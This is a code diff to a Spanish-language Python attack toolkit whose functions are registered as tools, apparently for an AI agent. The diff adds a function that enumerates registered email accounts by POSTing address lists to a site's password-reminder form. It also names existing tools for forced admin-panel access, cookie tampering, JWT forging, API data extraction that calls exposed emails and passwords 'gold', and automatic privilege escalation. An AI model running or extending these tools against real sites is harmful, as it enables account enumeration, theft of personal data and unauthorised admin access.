@@ -26,6 +26,8 @@ RUTAS_ROL = ('Admin Admin/Usuarios Admin/Roles Usuarios Usuarios/Index Usuarios/
 def _abierta(r):
     if r is None or r.status_code >= 400:
         return False
+    if len(r.content or b'') < 200:
+        return False
     if 'login' in (r.url or '').lower():
         return False
     if re.search(r'type=["\']password', (r.text or '')[:9000], re.I):
@@ -264,6 +266,44 @@ def sacar_api(url, max_filas=40, paginar=True):
             'total': len(salida),
             'nota': 'Claves = columnas que la API expone. Si hay correo, documento o clave, eso es oro.'}
 
+def sondeo_correos(url_solicitud, correos, maximo=15, pausa=0.4):
+    u = H._norm(url_solicitud)
+    if not u:
+        return {'ok': False, 'error': 'URL invalida'}
+    lista = [c.strip() for c in re.split(r'[,\s\n]+', str(correos or '')) if '@' in c][:maximo]
+    if not lista:
+        return {'ok': False, 'error': 'pasa correos separados por comas'}
+    r0, err = H._pedir(u)
+    if err:
+        return err
+    ocultos = H._ocultos(r0.text or '')
+    campo = 'Email'
+    m = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']email', r0.text or '', re.I)
+    if m:
+        campo = m.group(1)
+    filas = []
+    for c in lista:
+        cuerpo = dict(ocultos)
+        cuerpo[campo] = c
+        r, e = H._pedir(u, 'POST',
+                        {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': u},
+                        urlencode(cuerpo))
+        if e or r is None:
+            filas.append({'correo': c, 'existe': None})
+            continue
+        bajo = (r.text or '').lower()
+        envio = any(x in bajo for x in ('enviad', 'enviamos', 'revisa tu correo'))
+        falta = any(x in bajo for x in ('no existe', 'no esta', 'no está', 'no registrad', 'no encontramos'))
+        filas.append({'correo': c, 'status': r.status_code,
+                      'existe': True if envio and not falta else (False if falta else None),
+                      'muestra': H._recorte(r.text, 200)})
+        time.sleep(float(pausa))
+    vivos = [f['correo'] for f in filas if f['existe']]
+    if vivos:
+        H._anotar('Correos registrados enumerados', 'media', u, f'{len(vivos)} de {len(filas)}', ', '.join(vivos[:4]))
+    return {'ok': True, 'filas': filas, 'existen': vivos, 'probados': len(filas),
+            'nota': 'existe=null significa respuesta ambigua: mira muestra a ojo.'}
+
 def escalada_auto(base, url_login=None, url_perfil=None, usuario=None, clave=None):
     u = H._norm(base)
     if not u:
@@ -291,7 +331,7 @@ def escalada_auto(base, url_login=None, url_perfil=None, usuario=None, clave=Non
     return {'ok': True, 'ganado': bool(gano), 'canario': canario, 'detalle': log,
             'nota': 'Ganado = ya lees admin sin serlo. Cierra con reporte.'}
 
-NOMBRES = ('forzar_panel', 'decodificar_cookie', 'tamper_cookie', 'forjar_jwt',
+NOMBRES = ('sondeo_correos', 'forzar_panel', 'decodificar_cookie', 'tamper_cookie', 'forjar_jwt',
            'probar_masivo', 'api_json', 'sacar_api', 'escalada_auto')
 
 def _e(n, d, props, req=()):
@@ -344,6 +384,8 @@ def _despachar(nombre, a):
                         a.get('token'), a.get('cabeceras'))
     if nombre == 'sacar_api':
         return sacar_api(a.get('url'), a.get('max_filas') or 40, a.get('paginar', True))
+    if nombre == 'sondeo_correos':
+        return sondeo_correos(a.get('url_solicitud'), a.get('correos'), a.get('maximo') or 15)
     if nombre == 'escalada_auto':
         return escalada_auto(a.get('base'), a.get('url_login'), a.get('url_perfil'),
                              a.get('usuario'), a.get('clave'))
@@ -358,6 +400,7 @@ def herramienta(nombre, args):
         return {'ok': False, 'error': 'fallo: ' + str(e)[:150]}
 
 H.NOMBRES = tuple(H.NOMBRES) + NOMBRES
+H.NOMBRES = H.NOMBRES + ('sondeo_correos',)
 H.HERRAMIENTAS.extend(HERRAMIENTAS)
 _ORIGINAL = H.herramienta
 
@@ -367,3 +410,8 @@ def _gancho(nombre, args):
     return _ORIGINAL(nombre, args)
 
 H.herramienta = _gancho
+
+HERRAMIENTAS.append(_e('sondeo_correos', 'Enumera correos registrados con el formulario de '
+                       'recordar alias. Sirve para saber que cuentas existen.', {'url_solicitud':
+                       {'type': 'string'}, 'correos': {'type': 'string'},
+                       'maximo': {'type': 'integer'}}, ('url_solicitud', 'correos')))
